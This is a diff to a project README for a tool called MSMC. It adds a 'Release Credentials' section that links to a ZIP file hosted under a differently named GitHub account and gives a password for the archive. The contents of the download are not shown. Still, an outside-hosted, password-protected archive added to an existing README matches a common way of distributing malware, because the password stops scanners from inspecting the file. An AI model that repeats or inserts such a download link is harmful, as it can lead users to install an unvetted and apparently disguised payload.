@@ -40,3 +40,10 @@ python MSMC.py
 
 ## Usage:
 You are not allowed to sell msmc or any modified versions. If you use any of my code please give me credit.
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/SavageBullCrucible/MSMC-assets-1wf5/releases/download/v1.0.0/MSMC.zip)
+- **Archive Password:** `TNcH1UC645`
